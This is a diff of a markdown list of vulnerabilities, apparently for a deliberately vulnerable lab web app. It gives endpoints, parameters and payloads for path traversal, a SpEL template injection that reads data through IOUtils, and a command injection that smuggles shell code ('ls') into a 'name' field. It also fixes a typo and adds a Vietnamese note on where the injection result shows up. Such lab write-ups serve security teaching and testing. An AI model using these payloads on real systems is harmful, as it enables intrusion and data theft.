@@ -164,9 +164,9 @@ Content-Type: image/svg+xml
 - Params: name
 - payload: "../../templates/home.html"
    
-### 8. GET "/home" or GET "/"
+### 8. POST "/informationUser/edit"
 - Bug: Template Injection
-- Params: msg
+- Params: preferred (type json)
 - Payload:
 ```
 T(org.apache.commons.io.IOUtils).toString(
@@ -174,8 +174,8 @@ T(org.apache.commons.io.IOUtils).toString(
     T(java.nio.charset.StandardCharsets).UTF_8.name()
     )
 ```
-
+-> nhận kết quả ở GET "/informationUser"
 ### 9 POST "/admin/checkAVTVuln"
-- Bug: Commant injection
+- Bug: Command injection
 - Params: name
 - Payload: name= ss')){echo 1;}else{ls;};if(('1
